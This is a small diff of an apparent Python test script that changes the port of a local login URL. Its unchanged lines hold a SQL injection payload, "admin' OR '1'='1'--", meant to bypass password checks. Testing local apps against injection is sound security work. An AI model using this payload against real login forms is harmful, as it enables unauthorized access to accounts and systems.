@@ -1,7 +1,7 @@
 import requests
 
 # URL to be tested
-url = "http://127.0.0.1:5000/login"
+url = "http://127.0.0.1:5001/login"
 params = {
     'username': "admin' OR '1'='1'--",
     'password': 'any_password'  # The password can be anything since the SQL injection should bypass it
